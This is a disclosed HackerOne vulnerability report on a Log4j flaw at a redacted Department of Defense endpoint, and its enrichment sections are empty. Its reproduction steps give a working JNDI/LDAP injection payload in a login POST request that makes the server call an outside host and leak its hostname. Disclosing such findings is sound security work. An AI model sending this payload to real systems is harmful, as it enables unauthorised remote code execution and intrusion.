---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1631364'
original_report_id: '1631364'
title: ██████_log4j - https://██████
weakness: Code Injection
team_handle: deptofdefense
created_at: '2022-07-08T13:59:08.900Z'
disclosed_at: '2022-09-06T19:07:13.913Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- code-injection
---

# ██████_log4j - https://██████

## Metadata

- HackerOne Report ID: 1631364
- Weakness: Code Injection
- Program: deptofdefense
- Disclosed At: 2022-09-06T19:07:13.913Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi security team, i found a log4j vulnerability in your aplication

## Impact

Logging untrusted or user controlled data with a vulnerable version of Log4J may result in Remote Code Execution (RCE) against your application. This includes untrusted data included in logged errors such as exception traces, authentication failures, and other unexpected vectors of user controlled input.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Send POST request to this endpoint --->  https://██████/mifs/j_spring_security_check


the post request: 

j_username=${jndi:ldap://${hostName}.youinteractsserver}&j_password=password&logincontext=employee

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
